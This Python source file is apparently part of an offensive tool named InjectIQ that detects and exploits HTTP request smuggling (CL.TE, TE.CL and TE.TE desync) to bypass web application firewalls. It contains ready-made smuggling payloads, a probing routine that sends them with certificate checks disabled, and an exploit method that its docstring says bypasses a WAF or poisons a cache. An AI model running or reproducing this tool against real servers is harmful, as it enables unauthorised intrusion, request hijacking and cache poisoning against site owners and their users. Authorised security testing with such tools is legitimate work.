"""
InjectIQ v2 — HTTP Request Smuggling Engine
CL.TE, TE.CL, TE.TE desync attacks for WAF bypass.
"""

import asyncio
from dataclasses import dataclass
from enum import Enum

import httpx


class SmugglingType(Enum):
    CL_TE = "cl_te"  # Content-Length wins, Transfer-Encoding ignored by frontend
    TE_CL = "te_cl"  # Transfer-Encoding wins, Content-Length ignored by frontend
    TE_TE = "te_te"  # Transfer-Encoding obfuscation confuses one server


@dataclass
class SmugglingResult:
    smuggling_type: SmugglingType
    vulnerable: bool
    smuggled_request: str
    response_diff: str = ""
    confidence: float = 0.0


class SmugglingEngine:
    """HTTP request smuggling detection and exploitation."""

    SMUGGLING_PROBES = {
        SmugglingType.CL_TE: {
            "method": "POST",
            "headers": {
                "Transfer-Encoding": "chunked",
                "Content-Length": "6",
            },
            "body": "0\r\n\r\nG",
        },
        SmugglingType.TE_CL: {
            "method": "POST",
            "headers": {
                "Transfer-Encoding": "chunked",
                "Content-Length": "4",
            },
            "body": "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
        },
        SmugglingType.TE_TE: {
            "method": "POST",
            "headers": {
                "Transfer-Encoding": "chunked",
                "Transfer-encoding": "identity",
            },
            "body": "0\r\n\r\n",
        },
    }

    def __init__(self):
        self.client = httpx.AsyncClient(timeout=15, verify=False)

    async def detect(self, target_url: str) -> list[SmugglingResult]:
        """Test all smuggling types against target."""
        results = []

        for smug_type, probe in self.SMUGGLING_PROBES.items():
            try:
                # Send probe
                resp1 = await self.client.request(
                    probe["method"], target_url,
                    headers=probe["headers"],
                    content=probe["body"],
                )

                # Send normal request as baseline
                resp2 = await self.client.get(target_url)

                # Check for timeouts or different responses (smuggling indicators)
                vulnerable = False
                diff = ""

                if resp1.status_code != resp2.status_code:
                    vulnerable = True
                    diff = f"Status code changed: {resp2.status_code} -> {resp1.status_code}"

                if abs(len(resp1.text) - len(resp2.text)) > 100:
                    vulnerable = True
                    diff = f"Response length changed: {len(resp2.text)} -> {len(resp1.text)}"

                results.append(SmugglingResult(
                    smuggling_type=smug_type,
                    vulnerable=vulnerable,
                    smuggled_request=probe["body"],
                    response_diff=diff,
                    confidence=0.7 if vulnerable else 0.1,
                ))

            except httpx.TimeoutException:
                results.append(SmugglingResult(
                    smuggling_type=smug_type,
                    vulnerable=True,
                    smuggled_request=probe["body"],
                    response_diff="Timeout - possible desync",
                    confidence=0.9,
                ))
            except Exception:
                continue

        return results

    async def exploit(self, target_url: str,
                      smug_type: SmugglingType, smuggled_request: str) -> dict:
        """Exploit confirmed smuggling to bypass WAF or poison cache."""
        if smug_type == SmugglingType.CL_TE:
            exploit_body = f"{len(smuggled_request):x}\r\n{smuggled_request}\r\n0\r\n\r\n"
            headers = {
                "Transfer-Encoding": "chunked",
                "Content-Length": str(len(exploit_body)),
            }
        elif smug_type == SmugglingType.TE_CL:
            exploit_body = smuggled_request
            headers = {
                "Transfer-Encoding": "chunked",
                "Content-Length": "4",
            }
        else:
            exploit_body = smuggled_request
            headers = {
                "Transfer-Encoding": "chunked",
                "Transfer-encoding": "identity",
            }

        try:
            resp = await self.client.request("POST", target_url, headers=headers, content=exploit_body)
            return {"status": resp.status_code, "headers": dict(resp.headers), "body": resp.text[:1000]}
        except Exception as e:
            return {"error": str(e)}
